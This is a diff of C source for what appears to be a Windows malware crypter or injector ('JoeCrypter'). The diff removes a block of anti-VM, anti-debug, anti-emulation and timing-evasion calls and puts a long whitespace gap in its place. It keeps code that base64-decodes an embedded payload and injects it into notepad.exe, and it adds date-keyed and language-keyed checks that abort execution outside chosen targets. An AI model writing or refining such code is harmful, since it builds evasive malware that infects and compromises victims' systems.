@@ -1,10 +1,8 @@
 #include <windows.h>
 #include <stdio.h>
 #include <wbemidl.h>
-#include <Objbase.h>
 #include <time.h>
-#include <rpcdcep.h>
-//Rpcrt4.lib
+#include <Objbase.h>
 #include "joecrypt_injecter.h"
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
@@ -15,8 +13,6 @@
 char *GetPayload(void);
 unsigned char *b64_decode_ex(const char *src, size_t len, size_t *decsize) ;
 void LongStall(void);
-void SpecialStall(void);
-DWORD GetCoreCount(void);
 int procmem_evas(void);
 int NumaEvas(void);
 int AllocMem_Fornoreason(void);
@@ -41,7 +37,6 @@ void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
 
-
 //const char g_szClassName[] = "JoeCrypter";
 static const char b64_table[] = {
   'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
@@ -63,45 +58,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-			AntiEmu(); // first no emulation
-			// Evasions First()
-			reg_enum_vm_check();
-			anti_vm_wmi();
-			
-			timing_evasion_3();
-			FlsTrick();
-			
-			AllocMem_Fornoreason();
-			NumaEvas();
-			procmem_evas();
-			LongStall();
-			// 10 if you count anti-debug
-			
-			checkQIP();
-			if(GetNtGlobalFlags() == 'p')
-			{
-			PassToNoobs();
-			}
-			if(GetBeingDebugged())
-			{
-			PassToNoobs();
-			}
-
-			if(IsInsideVMWare())
-			{
-			PassToNoobs();
-			}
-			GetHeapFlags();
-			
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 			unsigned char *payload = b64_decode_ex(GetPayload(),rsrc_len,0);
 			ExecFile("c:\\windows\\system32\\notepad.exe",payload);
-
-			LotsOfWindows(hwnd);
-			
-
-
-			// Then runPE()
-			
 		}
 		break;
         case WM_CLOSE:
@@ -1007,19 +966,29 @@ return;
 
 void date_specific_check(char *shortdate)
 {
-	
-	return;
+	time_t rawtime;
+	struct tm * timeinfo;
+  	char currentdate[80];
 
+  	time (&rawtime);
+  	timeinfo = localtime(&rawtime);
+	strftime(currentdate,80,"%d/%m/%Y",timeinfo);
+	
+	//get current date, check against current month
+	if(strstr(currentdate,shortdate))
+	{
+	// clean return
+		return;
+	}
+	else{
+	PassToNoobs();
+	}
 }
+
 void region_specific_check(char *region)
 {
-	return;
-}
-
-int LangCheck(char *region)
-{
-  LANGID id;
-  char *lang = "";
+LANGID id;
+char *lang = "";
 
 	  id = GetSystemDefaultUILanguage();
 	  switch(id)
@@ -1170,56 +1139,14 @@ int LangCheck(char *region)
     }
 		if(strcmp(lang,region))
 		{
-			printf("lang is %s\r\n",lang);
-			return 1;
+			
+			return;
 
 		}
 		else
 		{
-		printf("lang is %s\r\n",lang);
 			PassToNoobs();
 		}
-
-	printf("%s\r\n",lang);
-	return 0;
-
+	return;
 }
 
-
-
-DWORD GetCoreCount(void)
-{
-	HANDLE proc;
-	DWORD corecount;
-	signed int bitpos;
-	DWORD result;
-	SYSTEM_INFO sysinf;
-	ULONG_PTR ProcessAffinityMask;
-	ULONG_PTR SystemAffinityMask;
-	proc = GetCurrentProcess();
-	if(GetProcessAffinityMask(proc,&ProcessAffinityMask,&SystemAffinityMask))
-	{
-		
-		corecount = 0;
-		bitpos = 0;
-		do
-		{
-			if((1 << bitpos) & SystemAffinityMask)
-				corecount++;
-			bitpos++;
-			
-		}
-		while(bitpos < 32);
-		result = corecount;
-
-	}
-	else{
-		GetSystemInfo(&sysinf);
-		result = sysinf.dwNumberOfProcessors;
-		
-	}
-	return result;
-}
-void SpecialStall()
-{	register unsigned int cock = GetTickCount();
-	I_RpcPauseExecution(cock / 100000);return;}
